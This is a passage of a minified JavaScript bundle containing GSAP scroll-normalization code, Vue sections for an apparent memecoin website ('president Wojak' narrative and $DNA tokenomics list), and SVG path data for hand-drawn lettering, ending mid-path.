                };
            };
        for (l in e)
            n[l] =
                "on" === l.substr(0, 2) && St(e[l]) && "onRefreshInit" !== l
                    ? o(0, e[l])
                    : e[l];
        return (
            St(s) &&
            ((s = s()),
                at(le, "refresh", function() {
                    return (s = e.batchMax());
                })),
            u2(r).forEach(function(a) {
                var c = {};
                for (l in n) c[l] = n[l];
                (c.trigger = a), t.push(le.create(c));
            }),
            t
        );
    });
var Fs,
    Ds = function(e, t, n, i) {
        return (
            t > i ? e(i) : t < 0 && e(0),
            n > i ? (i - t) / (n - t) : n < 0 ? t / (t - n) : 1
        );
    },
    K2 = function r(e, t) {
        !0 === t
            ? e.style.removeProperty("touch-action")
            : (e.style.touchAction =
                !0 === t
                    ? "auto"
                    : t
                        ? "pan-" + t + (Xe.isTouch ? " pinch-zoom" : "")
                        : "none"),
            e === c1 && r(Be, t);
    },
    In = { auto: 1, scroll: 1 },
    Ma = function(e) {
        var a,
            t = e.event,
            n = e.target,
            i = e.axis,
            s = (t.changedTouches ? t.changedTouches[0] : t).target,
            o = s._gsap || j.core.getCache(s),
            l = wt();
        if (!o._isScrollT || l - o._isScrollT > 2e3) {
            for (
                ;
                s &&
                s !== Be &&
                ((s.scrollHeight <= s.clientHeight && s.scrollWidth <= s.clientWidth) ||
                    (!In[(a = f1(s)).overflowY] && !In[a.overflowX]));

            )
                s = s.parentNode;
            (o._isScroll =
                s &&
                s !== n &&
                !L3(s) &&
                (In[(a = f1(s)).overflowY] || In[a.overflowX])),
                (o._isScrollT = l);
        }
        (o._isScroll || "x" === i) && (t.stopPropagation(), (t._gsapAllow = !0));
    },
    q4 = function(e, t, n, i) {
        return Xe.create({
            target: e,
            capture: !0,
            debounce: !1,
            lockAxis: !0,
            type: t,
            onWheel: (i = i && Ma),
            onPress: i,
            onDrag: i,
            onScroll: i,
            onEnable: function() {
                return n && at(Pe, Xe.eventTypes[0], Bs, !1, !0);
            },
            onDisable: function() {
                return rt(Pe, Xe.eventTypes[0], Bs, !0);
            },
        });
    },
    Ea = /(input|label|select|textarea)/i,
    Bs = function(e) {
        var t = Ea.test(e.target.tagName);
        (t || Fs) && ((e._gsapAllow = !0), (Fs = t));
    },
    ka = function(e) {
        Hn(e) || (e = {}),
            (e.preventDefault = e.isNormalizer = e.allowClicks = !0),
            e.type || (e.type = "wheel,touch"),
            (e.debounce = !!e.debounce),
            (e.id = e.id || "normalizer");
        var o,
            l,
            S,
            w,
            z,
            W,
            ue,
            te,
            t = e,
            n = t.normalizeScrollX,
            i = t.momentum,
            s = t.allowNestedScroll,
            a = kt(e.target) || c1,
            c = j.core.globals().ScrollSmoother,
            u = c && c.get(),
            h =
                j1 &&
                ((e.content && kt(e.content)) ||
                    (u && !1 !== e.content && !u.smooth() && u.content())),
            f = f3(a, qe),
            d = f3(a, Ct),
            m = 1,
            p =
                (Xe.isTouch && _e.visualViewport
                    ? _e.visualViewport.scale * _e.visualViewport.width
                    : _e.outerWidth) / _e.innerWidth,
            y = 0,
            v = St(i)
                ? function() {
                    return i(o);
                }
                : function() {
                    return i || 2.8;
                },
            C = q4(a, e.type, !0, s),
            O = function() {
                return (w = !1);
            },
            D = w1,
            M = w1,
            I = function() {
                (l = r3(a, qe)),
                    (M = er(j1 ? 1 : 0, l)),
                    n && (D = er(0, r3(a, Ct))),
                    (S = F3);
            },
            R = function() {
                (h._gsap.y = Fr(parseFloat(h._gsap.y) + f.offset) + "px"),
                    (h.style.transform =
                        "matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, " +
                        parseFloat(h._gsap.y) +
                        ", 0, 1)"),
                    (f.offset = f.cacheID = 0);
            },
            J = function() {
                I(),
                    z.isActive() &&
                    z.vars.scrollY > l &&
                    (f() > l ? z.progress(1) && f(l) : z.resetTo("scrollY", l));
            };
        return (
            h && j.set(h, { y: "+=0" }),
            (e.ignoreCheck = function(U) {
                return (
                    (j1 &&
                        "touchmove" === U.type &&
                        (function() {
                            if (w) {
                                requestAnimationFrame(O);
                                var Y = Fr(o.deltaY / 2),
                                    $ = M(f.v - Y);
                                if (h && $ !== f.v + f.offset) {
                                    f.offset = $ - f.v;
                                    var fe = Fr((parseFloat(h && h._gsap.y) || 0) - f.offset);
                                    (h.style.transform =
                                        "matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, " +
                                        fe +
                                        ", 0, 1)"),
                                        (h._gsap.y = fe + "px"),
                                        (f.cacheID = ce.cache),
                                        h3();
                                }
                                return !0;
                            }
                            f.offset && R(), (w = !0);
                        })()) ||
                    (m > 1.05 && "touchstart" !== U.type) ||
                    o.isGesturing ||
                    (U.touches && U.touches.length > 1)
                );
            }),
            (e.onPress = function() {
                var U = m;
                (m = Fr(((_e.visualViewport && _e.visualViewport.scale) || 1) / p)),
                    z.pause(),
                    U !== m && K2(a, m > 1.01 || (!n && "x")),
                    (W = d()),
                    (ue = f()),
                    I(),
                    (S = F3);
            }),
            (e.onRelease = e.onGestureStart =
                function(U, Y) {
                    if ((f.offset && R(), Y)) {
                        ce.cache++;
                        var fe,
                            b,
                            $ = v();
                        n &&
                            ((b = (fe = d()) + (0.05 * $ * -U.velocityX) / 0.227),
                                ($ *= Ds(d, fe, b, r3(a, Ct))),
                                (z.vars.scrollX = D(b))),
                            (b = (fe = f()) + (0.05 * $ * -U.velocityY) / 0.227),
                            ($ *= Ds(f, fe, b, r3(a, qe))),
                            (z.vars.scrollY = M(b)),
                            z.invalidate().duration($).play(0.01),
                            ((j1 && z.vars.scrollY >= l) || fe >= l - 1) &&
                            j.to({}, { onUpdate: J, duration: $ });
                    } else te.restart(!0);
                }),
            (e.onWheel = function() {
                z._ts && z.pause(), wt() - y > 1e3 && ((S = 0), (y = wt()));
            }),
            (e.onChange = function(U, Y, $, fe, b) {
                if (
                    (F3 !== S && I(),
                        Y && n && d(D(fe[2] === Y ? W + (U.startX - U.x) : d() + Y - fe[1])),
                        $)
                ) {
                    f.offset && R();
                    var Se = b[2] === $,
                        be = Se ? ue + U.startY - U.y : f() + $ - b[1],
                        Ot = M(be);
                    Se && be !== Ot && (ue += Ot - be), f(Ot);
                }
                ($ || Y) && h3();
            }),
            (e.onEnable = function() {
                K2(a, !n && "x"),
                    le.addEventListener("refresh", J),
                    at(_e, "resize", J),
                    f.smooth &&
                    ((f.target.style.scrollBehavior = "auto"),
                        (f.smooth = d.smooth = !1)),
                    C.enable();
            }),
            (e.onDisable = function() {
                K2(a, !0),
                    rt(_e, "resize", J),
                    le.removeEventListener("refresh", J),
                    C.kill();
            }),
            (e.lockAxis = !1 !== e.lockAxis),
            ((o = new Xe(e)).iOS = j1),
            j1 && !f() && f(1),
            j1 && j.ticker.add(w1),
            (te = o._dc),
            (z = j.to(o, {
                ease: "power4",
                paused: !0,
                scrollX: n ? "+=0.1" : "+=0",
                scrollY: "+=0.1",
                onComplete: te.vars.onComplete,
            })),
            o
        );
    };
(le.sort = function(r) {
    return se.sort(
        r ||
        function(e, t) {
            return (
                -1e6 * (e.vars.refreshPriority || 0) +
                e.start -
                (t.start + -1e6 * (t.vars.refreshPriority || 0))
            );
        }
    );
}),
    (le.observe = function(r) {
        return new Xe(r);
    }),
    (le.normalizeScroll = function(r) {
        if (typeof r > "u") return Lt;
        if (!0 === r && Lt) return Lt.enable();
        if (!1 === r) return Lt && Lt.kill();
        var e = r instanceof Xe ? r : ka(r);
        return (
            Lt && Lt.target === e.target && Lt.kill(), L3(e.target) && (Lt = e), e
        );
    }),
    (le.core = {
        _getVelocityProp: Oi,
        _inputObserver: q4,
        _scrollers: ce,
        _proxies: O1,
        bridge: {
            ss: function() {
                t1 || Z3("scrollStart"), (t1 = wt());
            },
            ref: function() {
                return dt;
            },
        },
    }),
    U4() && j.registerPlugin(le),
    Ut.registerPlugin(le);
const Ra = $3({
    name: "NarrativeSection",
    setup() {
        const r = dn();
        return (
            d3(() => {
                
            }),
            { whyBroke: r }
        );
    },
}),
    Q4 = (r) => (Tr("data-v-1604e306"), (r = r()), Cr(), r),
    Ia = { ref: "whyBroke", class: "flex flex-col items-center" },
    Da = Q4(() => me("h2", { class: "why-broke" }, "president Wojak", -1)),
    Fa = Q4(() =>
        me(
            "p",
            { class: "broke-text text-center px-4 py-4 lg:px-72 lg:py-8" },
            "vote 4 pojak 2024",
            -1,
        
    )),
    miA = Q4(() => me(
            "p",
                { class: "broke-text text-center px-4 py-4 lg:px-72 lg:py-8" },
                "NGMI",
            
    )),
    miB = Q4(() => me(
        "p",
            { class: "broke-text text-center px-4 py-4 lg:px-72 lg:py-8" },
            "Type Of Vibe",
        
)),
    Ba = [Da, Fa];
function La(r, e, t, n, i, s) {
    return p1(), Y1("section", Ia, Ba, 512);
}
const Na = U3(Ra, [
    ["render", La],
    ["__scopeId", "data-v-1604e306"],
]);
Ut.registerPlugin(le);
const Za = $3({
    name: "TokenomicsSection",
    setup() {
        const r = dn();
        return (
            d3(() => {
                let e = Ut.timeline({
                    scrollTrigger: { trigger: r.value, start: "top center" },
                });
                e.fromTo(".tokelabel", { opacity: 0, x: -50 }, { opacity: 1, x: 0 }),
                    e.fromTo(
                        ".tokecontent",
                        { opacity: 0, x: 50 },
                        { opacity: 1, x: 0 },
                        "<"
                    );
            }),
            { tokeSection: r }
        );
    },
}),
    G4 = (r) => (Tr("data-v-52fa2cf6"), (r = r()), Cr(), r),
    $a = { ref: "tokeSection", class: "flex flex-col items-center relative" },
    za = G4(() => me("h2", { class: "tokelabel" }, "Tokenomics", -1)),
    Ua = G4(() =>
        me(
            "div",
            { class: "flex items-center justify-center" },
            [
                me("ul", { class: "tokecontent flex flex-col items-center" }, [
                    me("li", { class: "text-center" }, "Mint authority revoked"),
                    me("li", null, "Liquidity Burned"),
                    me("li", null, "100,000,000 $DNA"),
                ]),
            ],
            -1
        )
    ),
    Wa = [];
function Ha(r, e, t, n, i, s) {
    return p1(), Y1("section", $a, Wa, 512);
}
const Ya = U3(Za, [
    ["render", Ha],
    ["__scopeId", "data-v-52fa2cf6"],
]),
    Xa = {
        xmlns: "http://www.w3.org/2000/svg",
        fill: "none",
        viewBox: "0 0 835 507",
    },
    Va = me(
        "path",
        {
            stroke: "#000",
            d: "m189.5 506 15.898-24.016 34.161 9.925 9.114-66.094 26.36 33.613 43.042-106.379 23.462 31.253 13.223-22.65 17.082 40.574 19.918-59.053 14.301 28.183 46.109-118.397L523.211 28M126.245 478.564l48 27m134-89 48 27m13.229-184.983 55.067.839M582.008 28.5l55.066.839",
        },
        null,
        -1
    ),
    ja = me(
        "path",
        {
            fill: "#000",
            d: "m3.83 453.6.4-1.05.6.9c.3.433.684.7 1.15.8.5.1 1.084.183 1.75.25.668.033 1.25.2 1.75.5.468.233 1.25.433 2.35.6 1.1.133 2.168.55 3.2 1.25.9.633 1.434 1.1 1.6 1.4.168.3.25 1.033.25 2.2 0 1.567-.25 2.733-.75 3.5-.6.9-1.4 1.717-2.4 2.45-1 .733-1.916 1.167-2.75 1.3-2.4.467-2.116.933.85 1.4.334.067.7.133 1.1.2.9.1 1.718.45 2.45 1.05.734.6 1.45 1.517 2.15 2.75l1.05 1.75-.85 2.85c-.566 1.867-.866 2.983-.9 3.35 0 .567-.45 1.267-1.35 2.1-.866.8-1.716 1.3-2.55 1.5a9.436 9.436 0 0 0-3.1 1.45l-2.3 1.7c-.632.467-1.066.583-1.3.35-.166-.167-.35-2.133-.55-5.9-.166-3.767-.366-7.867-.6-12.3-.2-4.433-.432-7.3-.7-8.6-.4-2.067-.632-3.5-.7-4.3-.066-.567-.182-.9-.35-1-.132-.133-.516-.167-1.15-.1-.866.067-1.3-.05-1.3-.35s.418-.533 1.25-.7c.868-.167 1.434-.6 1.7-1.3Zm10.9 4.4c-.866-.8-2.566-1.467-5.1-2-2.5-.533-3.966-.567-4.4-.1-.266.267-.332 1.367-.2 3.3.168 1.9.468 3.633.9 5.2l.35 1.25c.068.233.168.517.3.85.168.333.268.55.3.65.068.1.2.2.4.3.234.1.4.15.5.15.134-.033.384-.083.75-.15.4-.1.718-.2.95-.3.268-.1.684-.25 1.25-.45 2.934-1.1 4.534-3.033 4.8-5.8.068-.867.05-1.467-.05-1.8-.066-.333-.316-.7-.75-1.1Zm-1.9 12.45c-1.266-.333-2.633-.5-4.1-.5H6.48l.2 8c.134 5.333.284 8.083.45 8.25.134.1.368.033.7-.2.334-.267.7-.55 1.1-.85.4-.3.7-.45.9-.45.4 0 1.25-.35 2.55-1.05 1.3-.7 2.15-1.267 2.55-1.7.5-.567.95-1.483 1.35-2.75.4-1.267.6-2.433.6-3.5 0-2.8-1.35-4.55-4.05-5.25Zm6.752-7.5c0-.533.117-.8.35-.8.233 0 .783.667 1.65 2 .867 1.3 1.3 2.133 1.3 2.5 0 .7.283.667.85-.1.267-.333.55-.8.85-1.4 1.133-2.233 2-2.417 2.6-.55.2.567.4.967.6 1.2.233.2.567.333 1 .4.767.1 1.3 0 1.6-.3.333-.333.6-.467.8-.4.2.067.3.317.3.75 0 .5-.267.9-.8 1.2-.5.3-1.167.45-2 .45-.533 0-1-.133-1.4-.4-.4-.3-.667-.6-.8-.9-.133-.3-.333-.5-.6-.6-.233-.133-.483-.05-.75.25-.4.4-.717 2.067-.95 5-.2 2.933-.4 4.617-.6 5.05-.233.4-.4 1.2-.5 2.4a55.31 55.31 0 0 1-.35 3.2c-.133.9-.367 1.35-.7 1.35-.267 0-.433-.55-.5-1.65-.067-1.1-.1-3.6-.1-7.5 0-5.533-.117-8.567-.35-9.1-.067-.267-.267-.5-.6-.7a2.17 2.17 0 0 1-.65-.6c-.167-.3-.25-.55-.25-.75Zm17.14-3.3c.134-.133 1.534-.15 4.2-.05 2.867.1 4.967.517 6.3 1.25 1.334.733 2 1.833 2 3.3 0 .9.284 1.7.85 2.4.334.467.55 1.033.65 1.7.1.667.15 2 .15 4v1.1c0 1.8-.083 2.917-.25 3.35-.133.433-.683 1.083-1.65 1.95-.6.567-1.116 1.05-1.55 1.45l-1.8 1.75h-4.4c-2.066 0-3.4-.05-4-.15-.6-.133-1.25-.433-1.95-.9-1.266-.867-2.066-1.85-2.4-2.95-.333-1.133-.45-3.167-.35-6.1.1-2.833.35-4.75.75-5.75s1.167-1.583 2.3-1.75c.767-.067 1.417-.3 1.95-.7.534-.367 1.234-.533 2.1-.5.9 0 1.517.183 1.85.55.334.4.284.65-.15.75-.366.133-1.383.283-3.05.45-.666.033-1.166.067-1.5.1-.333.033-.7.133-1.1.3-.4.133-.683.25-.85.35-.166.1-.35.333-.55.7-.166.333-.283.65-.35.95-.033.267-.083.75-.15 1.45-.066.7-.1 1.35-.1 1.95v7.4l1.25 1.2c.6.567 1.167.917 1.7 1.05.567.133 1.967.233 4.2.3l4.7.15 1.75-1.95c1.067-1.167 1.717-2.1 1.95-2.8.234-.733.367-2.25.4-4.55 0-1.433-.066-2.533-.2-3.3-.133-.8-.283-1.317-.45-1.55a12.995 12.995 0 0 1-.65-1.05c-.233-.5-.416-1.133-.55-1.9-.166-1-.483-1.6-.95-1.8-.433-.233-2.25-.517-5.45-.85-3.2-.367-4.8-.7-4.8-1-.033-.1.017-.2.15-.3Zm15.135-5.8c0-.467.117-.683.35-.65.367.067.617.467.75 1.2.034.067.05.133.05.2.067.667.217 1.517.45 2.55.267 1 .467 2.317.6 3.95.167 1.633.25 3.867.25 6.7 0 4.333.2 6.767.6 7.3.3.4.534.567.7.5.167-.067.55-.45 1.15-1.15.534-.6 1.017-1.35 1.45-2.25a89.43 89.43 0 0 1 1.05-2.2c.267-.567.5-.85.7-.85.134 0 .217.05.25.15.067.067.084.217.05.45 0 .233-.05.55-.15.95-.066.367-.183.867-.35 1.5-.1.367-.5.933-1.2 1.7-.7.767-1.383 1.483-2.05 2.15-.633.633-.95 1-.95 1.1 0 .067.15.133.45.2.3.033.684.2 1.15.5.467.267.834.717 1.1 1.35.267.633.517 1.033.75 1.2.234.133.734.2 1.5.2 1.134 0 1.95-.217 2.45-.65.4-.3.717-.45.95-.45.267-.033.384.1.35.4 0 .267-.183.583-.55.95-.366.4-.75.667-1.15.8-.4.133-1.033.2-1.9.2-1 0-1.65-.067-1.95-.2-.3-.167-.65-.583-1.05-1.25-.533-.867-1.083-1.333-1.65-1.4-.566-.067-1.016.3-1.35 1.1-.266.733-.316 2.017-.15 3.85.234 2.333.067 3.75-.5 4.25-.166.1-.333.1-.5 0-.266-.167-.4-1.633-.4-4.4 0-1.633-.05-2.783-.15-3.45-.1-.667-.283-1.15-.55-1.45-.3-.333-.45-.583-.45-.75 0-.167.15-.417.45-.75.3-.333.484-1.05.55-2.15.1-1.133.15-3.6.15-7.4 0-5.833-.216-9.5-.65-11-.4-1.5-.6-2.5-.6-3Zm18.03 9.95c.766-.2 1.833-.25 3.2-.15 1.4.067 2.233.233 2.5.5.266.267.466.983.6 2.15.1.8.066 1.4-.1 1.8-.134.367-.5.9-1.1 1.6-.567.633-1.084 1.083-1.55 1.35-.434.233-1.117.433-2.05.6-2 .3-2.934.117-2.8-.55 0-.067.033-.167.1-.3.2-.3.933-.45 2.2-.45.733 0 1.3-.067 1.7-.2.433-.167.883-.467 1.35-.9.6-.567.966-1.283 1.1-2.15.133-.867-.017-1.533-.45-2-.567-.567-1.884-.633-3.95-.2-2.067.4-3.25.983-3.55 1.75-.2.433-.367 2.217-.5 5.35l-.2 4.7 3 2.9 5.05.2c3.566.133 5.266.333 5.1.6-.134.267-1.9.4-5.3.4h-5.25l-3.75-3.65v-4.35c0-3.1.316-5.267.95-6.5.633-1.233 1.866-2.067 3.7-2.5Zm32.379 18.45c.566-.467.95-.717 1.15-.75.2-.033.516.067.95.3.4.267.45.633.15 1.1-.834 1.4-1.667 1.683-2.5.85-.367-.333-.534-.567-.5-.7.033-.167.283-.433.75-.8Zm.65-15.8c.566-.433 1.116-.6 1.65-.5.533.1.8.4.8.9 0 .533-.367.9-1.1 1.1-.734.2-1.267.083-1.6-.35-.234-.233-.334-.417-.3-.55.033-.167.216-.367.55-.6Zm10.534-9.25c1.266-.8 2.016-1.067 2.25-.8.266.267.283.55.05.85-.2.267-.517.4-.95.4-.334 0-1.117.6-2.35 1.8-1.2 1.2-2.3 2.467-3.3 3.8-.934 1.267-1.517 3.5-1.75 6.7-.2 3.2.066 5.75.8 7.65a36.765 36.765 0 0 0 2.3 5.05c.9 1.533 1.65 2.5 2.25 2.9.733.533 2 .9 3.8 1.1 1.733.2 2.583.45 2.55.75-.034.267-.834.367-2.4.3-1.867-.1-3.284-.433-4.25-1-.934-.6-1.85-1.733-2.75-3.4-.867-1.567-1.467-2.833-1.8-3.8-.3-1-.6-1.717-.9-2.15-.434-.667-.65-2.65-.65-5.95 0-2.167.05-3.633.15-4.4.1-.767.366-1.533.8-2.3.8-1.567 1.783-3.05 2.95-4.45 1.166-1.4 2.233-2.417 3.2-3.05Zm256.343-8.25c.534-1.733.95-3.817 1.25-6.25.3-2.467.534-4.4.7-5.8.167-1.4.417-2.1.75-2.1.367 0 .55.333.55 1 0 1.267-.183 3.167-.55 5.7-.333 2.5-.633 4.067-.9 4.7-.4.9-.6 1.733-.6 2.5 0 .5-.066.95-.2 1.35-.133.367-.283.7-.45 1-.133.3-.283.933-.45 1.9-.133.933-.216 2.167-.25 3.7l-.05 4.15 2.85-.1c1.934-.1 3.8-.35 5.6-.75 1.5-.333 2.834-.483 4-.45 1.2.033 1.867.233 2 .6.067.2-.1.333-.5.4-.366.067-1.016.1-1.95.1-1.3 0-2.916.233-4.85.7-1.933.433-3.766.667-5.5.7l-3.3.05.15-2.65c.2-4 .767-7.483 1.7-10.45Zm19.89-5.15c.767-.2 1.834-.25 3.2-.15 1.4.067 2.234.233 2.5.5.267.267.467.983.6 2.15.1.8.067 1.4-.1 1.8-.133.367-.5.9-1.1 1.6-.566.633-1.083 1.083-1.55 1.35-.433.233-1.116.433-2.05.6-2 .3-2.933.117-2.8-.55 0-.067.034-.167.1-.3.2-.3.934-.45 2.2-.45.734 0 1.3-.067 1.7-.2.434-.167.884-.467 1.35-.9.6-.567.967-1.283 1.1-2.15.134-.867-.016-1.533-.45-2-.566-.567-1.883-.633-3.95-.2-2.066.4-3.25.983-3.55 1.75-.2.433-.366 2.217-.5 5.35l-.2 4.7 3 2.9 5.05.2c3.567.133 5.267.333 5.1.6-.133.267-1.9.4-5.3.4h-5.25l-3.75-3.65v-4.35c0-3.1.317-5.267.95-6.5.634-1.233 1.867-2.067 3.7-2.5Zm16.683 22.15c.367 0 .717-.133 1.05-.4.334-.3 1.017-.45 2.05-.45 2.334 0 3.767-1.15 4.3-3.45.3-1.333.417-3.15.35-5.45-.033-2.333-.216-3.917-.55-4.75l-.6-1.5h-3.45c-2.3 0-3.6-.183-3.9-.55-.333-.4-.366-1.25-.1-2.55.3-1.3.734-2.267 1.3-2.9.4-.433.784-.7 1.15-.8.367-.1 1-.133 1.9-.1 1.367.1 2.05.35 2.05.75s-.683.65-2.05.75c-1.166.067-1.966.3-2.4.7-.433.4-.65 1.1-.65 2.1v1.35h3.2c1.6 0 2.684.117 3.25.35.6.233.9.65.9 1.25 0 .367.267.9.8 1.6.767.967 1.034 2.783.8 5.45-.233 2.667-.866 4.933-1.9 6.8-.6 1.1-2.766 1.983-6.5 2.65-3.233.533-5.016.267-5.35-.8-.033-.133-.266-.683-.7-1.65-.433-.967-.733-1.9-.9-2.8-.1-.7-.116-1.183-.05-1.45.067-.267.267-.5.6-.7 1.334-.7 2.534-.517 3.6.55.434.433.7.867.8 1.3.134.433.2 1.167.2 2.2 0 1.1.05 1.8.15 2.1.1.267.317.4.65.4Zm-2.4-2.65c-.1-1.433-.266-2.283-.5-2.55a1.24 1.24 0 0 0-.9-.5c-.333-.067-.6 0-.8.2-.233.233-.233.867 0 1.9.267 1.033.617 1.867 1.05 2.5.534.767.884 1.067 1.05.9.2-.2.234-1.017.1-2.45Zm18.953 2.65c.367 0 .717-.133 1.05-.4.333-.3 1.017-.45 2.05-.45 2.333 0 3.767-1.15 4.3-3.45.3-1.333.417-3.15.35-5.45-.033-2.333-.217-3.917-.55-4.75l-.6-1.5h-3.45c-2.3 0-3.6-.183-3.9-.55-.333-.4-.367-1.25-.1-2.55.3-1.3.733-2.267 1.3-2.9.4-.433.783-.7 1.15-.8.367-.1 1-.133 1.9-.1 1.367.1 2.05.35 2.05.75s-.683.65-2.05.75c-1.167.067-1.967.3-2.4.7-.433.4-.65 1.1-.65 2.1v1.35h3.2c1.6 0 2.683.117 3.25.35.6.233.9.65.9 1.25 0 .367.267.9.8 1.6.767.967 1.033 2.783.8 5.45-.233 2.667-.867 4.933-1.9 6.8-.6 1.1-2.767 1.983-6.5 2.65-3.233.533-5.017.267-5.35-.8-.033-.133-.267-.683-.7-1.65-.433-.967-.733-1.9-.9-2.8-.1-.7-.117-1.183-.05-1.45.067-.267.267-.5.6-.7 1.333-.7 2.533-.517 3.6.55.433.433.7.867.8 1.3.133.433.2 1.167.2 2.2 0 1.1.05 1.8.15 2.1.1.267.317.4.65.4Zm-2.4-2.65c-.1-1.433-.267-2.283-.5-2.55a1.24 1.24 0 0 0-.9-.5c-.333-.067-.6 0-.8.2-.233.233-.233.867 0 1.9.267 1.033.617 1.867 1.05 2.5.533.767.883 1.067 1.05.9.2-.2.233-1.017.1-2.45Zm36.849-29.7.4-1.05.6.9c.3.433.683.7 1.15.8.5.1 1.083.183 1.75.25.667.033 1.25.2 1.75.5.467.233 1.25.433 2.35.6 1.1.133 2.167.55 3.2 1.25.9.633 1.433 1.1 1.6 1.4.167.3.25 1.033.25 2.2 0 1.567-.25 2.733-.75 3.5-.6.9-1.4 1.717-2.4 2.45-1 .733-1.917 1.167-2.75 1.3-2.4.467-2.117.933.85 1.4.333.067.7.133 1.1.2.9.1 1.717.45 2.45 1.05.733.6 1.45 1.517 2.15 2.75l1.05 1.75-.85 2.85c-.567 1.867-.867 2.983-.9 3.35 0 .567-.45 1.267-1.35 2.1-.867.8-1.717 1.3-2.55 1.5a9.437 9.437 0 0 0-3.1 1.45l-2.3 1.7c-.633.467-1.067.583-1.3.35-.167-.167-.35-2.133-.55-5.9-.167-3.767-.367-7.867-.6-12.3-.2-4.433-.433-7.3-.7-8.6-.4-2.067-.633-3.5-.7-4.3-.067-.567-.183-.9-.35-1-.133-.133-.517-.167-1.15-.1-.867.067-1.3-.05-1.3-.35s.417-.533 1.25-.7c.867-.167 1.433-.6 1.7-1.3Zm10.9 4.4c-.867-.8-2.567-1.467-5.1-2-2.5-.533-3.967-.567-4.4-.1-.267.267-.333 1.367-.2 3.3.167 1.9.467 3.633.9 5.2.167.6.283 1.017.35 1.25.067.233.167.517.3.85.167.333.267.55.3.65.067.1.2.2.4.3.233.1.4.15.5.15.133-.033.383-.083.75-.15.4-.1.717-.2.95-.3.267-.1.683-.25 1.25-.45 2.933-1.1 4.533-3.033 4.8-5.8.067-.867.05-1.467-.05-1.8-.067-.333-.317-.7-.75-1.1Zm-1.9 12.45c-1.267-.333-2.633-.5-4.1-.5h-2.25l.2 8c.133 5.333.283 8.083.45 8.25.133.1.367.033.7-.2.333-.267.7-.55 1.1-.85.4-.3.7-.45.9-.45.4 0 1.25-.35 2.55-1.05 1.3-.7 2.15-1.267 2.55-1.7.5-.567.95-1.483 1.35-2.75.4-1.267.6-2.433.6-3.5 0-2.8-1.35-4.55-4.05-5.25Zm6.751-7.5c0-.533.117-.8.35-.8.233 0 .783.667 1.65 2 .867 1.3 1.3 2.133 1.3 2.5 0 .7.283.667.85-.1.267-.333.55-.8.85-1.4 1.133-2.233 2-2.417 2.6-.55.2.567.4.967.6 1.2.233.2.567.333 1 .4.767.1 1.3 0 1.6-.3.333-.333.6-.467.8-.4.2.067.3.317.3.75 0 .5-.267.9-.8 1.2-.5.3-1.167.45-2 .45-.533 0-1-.133-1.4-.4-.4-.3-.667-.6-.8-.9-.133-.3-.333-.5-.6-.6-.233-.133-.483-.05-.75.25-.4.4-.717 2.067-.95 5-.2 2.933-.4 4.617-.6 5.05-.233.4-.4 1.2-.5 2.4-.1 1.2-.217 2.267-.35 3.2-.133.9-.367 1.35-.7 1.35-.267 0-.433-.55-.5-1.65-.067-1.1-.1-3.6-.1-7.5 0-5.533-.117-8.567-.35-9.1-.067-.267-.267-.5-.6-.7a2.174 2.174 0 0 1-.65-.6c-.167-.3-.25-.55-.25-.75Zm17.141-3.3c.133-.133 1.533-.15 4.2-.05 2.866.1 4.966.517 6.3 1.25 1.333.733 2 1.833 2 3.3 0 .9.283 1.7.85 2.4.333.467.55 1.033.65 1.7.1.667.15 2 .15 4v1.1c0 1.8-.084 2.917-.25 3.35-.134.433-.684 1.083-1.65 1.95-.6.567-1.117 1.05-1.55 1.45l-1.8 1.75h-4.4c-2.067 0-3.4-.05-4-.15-.6-.133-1.25-.433-1.95-.9-1.267-.867-2.067-1.85-2.4-2.95-.334-1.133-.45-3.167-.35-6.1.1-2.833.35-4.75.75-5.75s1.166-1.583 2.3-1.75c.766-.067 1.416-.3 1.95-.7.533-.367 1.233-.533 2.1-.5.9 0 1.516.183 1.85.55.333.4.283.65-.15.75-.367.133-1.384.283-3.05.45-.667.033-1.167.067-1.5.1-.334.033-.7.133-1.1.3-.4.133-.684.25-.85.35-.167.1-.35.333-.55.7-.167.333-.284.65-.35.95-.034.267-.084.75-.15 1.45-.067.7-.1 1.35-.1 1.95v7.4l1.25 1.2c.6.567 1.166.917 1.7 1.05.566.133 1.966.233 4.2.3l4.7.15 1.75-1.95c1.066-1.167 1.716-2.1 1.95-2.8.233-.733.366-2.25.4-4.55 0-1.433-.067-2.533-.2-3.3-.134-.8-.284-1.317-.45-1.55a12.742 12.742 0 0 1-.65-1.05c-.234-.5-.417-1.133-.55-1.9-.167-1-.484-1.6-.95-1.8-.434-.233-2.25-.517-5.45-.85-3.2-.367-4.8-.7-4.8-1-.034-.1.016-.2.15-.3Zm15.135-5.8c0-.467.116-.683.35-.65.366.067.616.467.75 1.2.033.067.05.133.05.2.066.667.216 1.517.45 2.55.266 1 .466 2.317.6 3.95.166 1.633.25 3.867.25 6.7 0 4.333.2 6.767.6 7.3.3.4.533.567.7.5.166-.067.55-.45 1.15-1.15.533-.6 1.016-1.35 1.45-2.25a86.56 86.56 0 0 1 1.05-2.2c.266-.567.5-.85.7-.85.133 0 .216.05.25.15.066.067.083.217.05.45 0 .233-.05.55-.15.95-.067.367-.184.867-.35 1.5-.1.367-.5.933-1.2 1.7-.7.767-1.384 1.483-2.05 2.15-.634.633-.95 1-.95 1.1 0 .067.15.133.45.2.3.033.683.2 1.15.5.466.267.833.717 1.1 1.35.266.633.516 1.033.75 1.2.233.133.733.2 1.5.2 1.133 0 1.95-.217 2.45-.65.4-.3.716-.45.95-.45.266-.033.383.1.35.4 0 .267-.184.583-.55.95-.367.4-.75.667-1.15.8-.4.133-1.034.2-1.9.2-1 0-1.65-.067-1.95-.2-.3-.167-.65-.583-1.05-1.25-.534-.867-1.084-1.333-1.65-1.4-.567-.067-1.017.3-1.35 1.1-.267.733-.317 2.017-.15 3.85.233 2.333.066 3.75-.5 4.25-.167.1-.334.1-.5 0-.267-.167-.4-1.633-.4-4.4 0-1.633-.05-2.783-.15-3.45-.1-.667-.284-1.15-.55-1.45-.3-.333-.45-.583-.45-.75 0-.167.15-.417.45-.75.3-.333.483-1.05.55-2.15.1-1.133.15-3.6.15-7.4 0-5.833-.217-9.5-.65-11-.4-1.5-.6-2.5-.6-3Zm18.028 9.95c.767-.2 1.834-.25 3.2-.15 1.4.067 2.234.233 2.5.5.267.267.467.983.6 2.15.1.8.067 1.4-.1 1.8-.133.367-.5.9-1.1 1.6-.566.633-1.083 1.083-1.55 1.35-.433.233-1.116.433-2.05.6-2 .3-2.933.117-2.8-.55 